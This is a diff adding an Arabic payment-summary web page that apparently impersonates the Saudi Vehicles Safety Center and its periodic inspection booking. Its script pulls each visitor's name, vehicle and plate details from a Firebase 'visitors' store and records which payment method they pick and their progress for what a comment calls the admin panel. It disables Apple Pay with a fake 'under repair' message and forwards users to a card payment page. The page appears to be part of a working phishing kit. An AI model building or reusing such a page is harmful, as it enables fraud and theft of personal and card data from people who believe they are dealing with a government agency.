@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ملخص الطلب والدفع - مركز سلامة المركبات</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root {
+            --main-green: #1e7344;
+            --light-green: #f0f9f4;
+            --text-dark: #333;
+            --border-color: #e0e0e0;
+            --error-red: #d93025;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: var(--text-dark);
+        }
+
+        .header-img {
+            width: 100%;
+            display: block;
+        }
+
+        .container {
+            padding: 15px;
+        }
+
+        .page-title {
+            text-align: center;
+            color: var(--main-green);
+            font-size: 20px;
+            font-weight: bold;
+            margin: 20px 0 5px 0;
+        }
+
+        .page-subtitle {
+            text-align: center;
+            color: #777;
+            font-size: 18px;
+            margin-bottom: 25px;
+        }
+
+        .card {
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+            background: #fff;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .card-header svg {
+            margin-left: 10px;
+            color: var(--main-green);
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #f5f5f5;
+            font-size: 14px;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            color: #888;
+        }
+
+        .info-value {
+            font-weight: 500;
+        }
+
+        .total-box {
+            background-color: var(--light-green);
+            display: flex;
+            justify-content: space-between;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
+            color: var(--main-green);
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .btn-outline {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 12px;
+            background-color: var(--main-green);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+
+        .payment-option {
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .payment-option.active {
+            border: 2px solid #2ecc71;
+            background-color: #fafffa;
+        }
+
+        .payment-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .payment-icons-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .visa-mc-icons {
+            width: 40px;
+            height: auto;
+            display: block;
+        }
+
+        .apple-pay-icon {
+            width: 50px;
+            height: auto;
+            display: block;
+        }
+
+        #apple-pay-error {
+            color: var(--error-red);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            font-weight: bold;
+        }
+
+        .radio-circle {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ddd;
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .active .radio-circle {
+            border-color: #2ecc71;
+        }
+
+        .active .radio-circle::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            background: #2ecc71;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .btn-submit {
+            background-color: #58c48d;
+            color: white;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .terms-box {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .footer-top-img, .footer-bottom-img {
+            width: 100%;
+            display: block;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            width: 92%;
+            max-width: 400px;
+            border-radius: 12px;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-close-top {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            color: #999;
+            z-index: 10;
+        }
+
+        .invoice-internal-header {
+            position: relative;
+            text-align: center;
+            margin-bottom: 20px;
+            padding-top: 10px;
+        }
+
+        .saso-logo-right {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 85px; 
+        }
+
+        .center-main-logo {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+
+        .center-text-ar {
+            color: var(--main-green);
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+
+        .center-text-en {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .invoice-title {
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: var(--main-green);
+            border-bottom: 2px solid var(--main-green);
+            display: inline-block;
+            margin: 0 auto 20px auto;
+            padding-bottom: 5px;
+            width: 100%;
+        }
+
+        .invoice-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .invoice-table tr td {
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+            font-size: 14px;
+        }
+
+        .invoice-table tr td:first-child {
+            color: #888;
+        }
+
+        .invoice-table tr td:last-child {
+            text-align: left;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .invoice-status-box {
+            background-color: #fff5f5;
+            color: #d93025;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+
+        .modal-footer-btn {
+            background-color: white;
+            border: 1px solid var(--main-green);
+            color: var(--main-green);
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg" alt="Header" class="header-img">
+
+    <div class="container">
+        <h1 class="page-title">خدمة الفحص الفني الدوري</h1>
+        <p class="page-subtitle">ملخص الطلب والدفع</p>
+
+        <div class="card">
+            <div class="card-header">
+                <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/></svg>
+                تفاصيل الخدمة
+            </div>
+            <div class="info-row"><span class="info-label">اسم الخدمة</span><span class="info-value">خدمة الفحص الفني الدوري</span></div>
+            <div class="info-row"><span class="info-label">رسوم الخدمة</span><span class="info-value">100 ر.س</span></div>
+            <div class="info-row"><span class="info-label">ضريبة القيمة المضافة (15%)</span><span class="info-value">15 ر.س</span></div>
+            <div class="total-box"><span>المجموع الكلي</span><span>115 ر.س</span></div>
+            <button class="btn-outline" onclick="showModal()">معاينة وثيقة الموعد</button>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M20,8H4V6H20M20,18H4V12H20M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z"/></svg>
+                طريقة الدفع
+            </div>
+
+            <div class="payment-option active" onclick="selectPayment(this, 'credit_card')">
+                <div class="payment-info">
+                    <div class="payment-icons-container">
+                        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" class="visa-mc-icons">
+                        <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard" class="visa-mc-icons">
+                    </div>
+                    <div>
+                        <div style="font-weight:bold; font-size:14px;">بطاقة ائتمان</div>
+                        <div style="font-size:12px; color:#888;">Visa, Mastercard</div>
+                    </div>
+                </div>
+                <div class="radio-circle"></div>
+            </div>
+
+            <div class="payment-option" onclick="selectPayment(this, 'apple')">
+                <div class="payment-info">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" class="apple-pay-icon">
+                    <div>
+                        <div style="font-weight:bold; font-size:14px;">Apple Pay</div>
+                        <div id="apple-pay-error">هذه الخدمه غير متاحة الان جاري الاصلاح</div>
+                    </div>
+                </div>
+                <div class="radio-circle"></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div style="color:var(--main-green); font-weight:bold; margin-bottom:15px; font-size:16px;">ملخص الطلب</div>
+            <div class="info-row"><span class="info-label">الخدمة</span><span class="info-value">خدمة الفحص الفني الدوري</span></div>
+            <div class="info-row"><span class="info-label">الرسوم</span><span class="info-value">100 ر.س</span></div>
+            <div class="info-row"><span class="info-label">الضريبة</span><span class="info-value">15 ر.س</span></div>
+            <div style="display:flex; justify-content:space-between; padding:15px 0; border-top:1px solid #eee; margin-top:10px;">
+                <span style="font-weight:bold; font-size:18px;">المجموع</span>
+                <span style="font-weight:bold; font-size:18px; color:var(--main-green);">115 ر.س</span>
+            </div>
+            <button class="btn-submit" onclick="handlePayment()">متابعة الدفع</button>
+            <div class="terms-box">بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية</div>
+        </div>
+    </div>
+
+    <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" alt="Footer Top" class="footer-top-img">
+    <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" alt="Footer Bottom" class="footer-bottom-img">
+
+    <div id="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-close-top" onclick="hideModal()">✕</div>
+            <div class="modal-body">
+                <div class="invoice-internal-header">
+                    <img src="https://i.ibb.co/7JPt9dQG/saso-logo.png" alt="SASO Logo" class="saso-logo-right">
+                    <img src="https://i.ibb.co/8g6zZ3hm/vsc-logo-icon-1.png" alt="VSC Logo" class="center-main-logo">
+                    <div class="center-text-ar">مركز سلامة المركبات</div>
+                    <div class="center-text-en">Vehicles Safety Center</div>
+                </div>
+                <div class="invoice-title">وثيقة موعد الفحص الفني الدوري</div>
+                <table class="invoice-table">
+                    <tr><td>الاسم</td><td id="db-name">جاري التحميل...</td></tr>
+                    <tr><td>نوع المركبة</td><td id="db-type">جاري التحميل...</td></tr>
+                    <tr><td>رقم المركبة</td><td id="db-plate">جاري التحميل...</td></tr>
+                    <tr><td>المنطقة</td><td id="db-region">جاري التحميل...</td></tr>
+                    <tr><td>مركز الفحص</td><td id="db-center">جاري التحميل...</td></tr>
+                    <tr><td>تاريخ الفحص</td><td id="db-date">جاري التحميل...</td></tr>
+                    <tr><td>وقت الفحص</td><td id="db-time">جاري التحميل...</td></tr>
+                </table>
+                <div class="invoice-status-box">حالة الموعد: بحاجة الى تأكيد الدفع ومتابعة الاجراءات</div>
+                <button class="modal-footer-btn" onclick="hideModal()">مركز سلامة المركبات</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // إعدادات الفايربيس الصحيحة
+        const firebaseConfig = {
+          apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8X6X8X6X8", 
+          authDomain: "saso-inspection.firebaseapp.com",
+          databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
+          projectId: "saso-inspection",
+          storageBucket: "saso-inspection.appspot.com",
+          messagingSenderId: "1009002235896",
+          appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+        };
+        
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+        let selectedMethod = 'credit_card';
+        const visitorId = localStorage.getItem('visitorId');
+
+        // وظيفة جلب البيانات وعرضها في الوثيقة
+        function fetchInvoiceData() {
+            if (!visitorId) return;
+            
+            // جلب البيانات من مسار الزوار
+            database.ref('visitors/' + visitorId).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    // تم تعديل الأسماء هنا لتطابق كود الإرسال في صفحة الحجز
+                    document.getElementById('db-name').innerText = data.fullName || '-';
+                    document.getElementById('db-type').innerText = data.vehicleType || '-';
+                    document.getElementById('db-plate').innerText = data.plateNumber || '-';
+                    document.getElementById('db-region').innerText = data.region || '-';
+                    document.getElementById('db-center').innerText = data.center || '-';
+                    document.getElementById('db-date').innerText = data.bookingDate || '-';
+                    document.getElementById('db-time').innerText = data.bookingTime || '-';
+                }
+            });
+        }
+
+        window.onload = fetchInvoiceData;
+
+        function selectPayment(element, type) {
+            document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('active'));
+            element.classList.add('active');
+            selectedMethod = type;
+            document.getElementById('apple-pay-error').style.display = (type === 'apple') ? 'block' : 'none';
+        }
+
+        function showModal() { 
+            document.getElementById('modal-overlay').style.display = 'flex'; 
+        }
+
+        function hideModal() { 
+            document.getElementById('modal-overlay').style.display = 'none'; 
+        }
+
+        function handlePayment() {
+            if (!visitorId) { window.location.href = 'payment.html'; return; }
+            
+            // تحديث حالة العميل ليظهر في الأدمن أنه اختار طريقة الدفع
+            database.ref('visitors/' + visitorId).update({
+                payment_method_selected: selectedMethod,
+                step: "انتقل لصفحة الدفع",
+                lastUpdate: new Date().toLocaleString('ar-SA')
+            }).then(() => { 
+                window.location.href = 'payment.html'; 
+            });
+        }
+    </script>
+</body>
+</html>
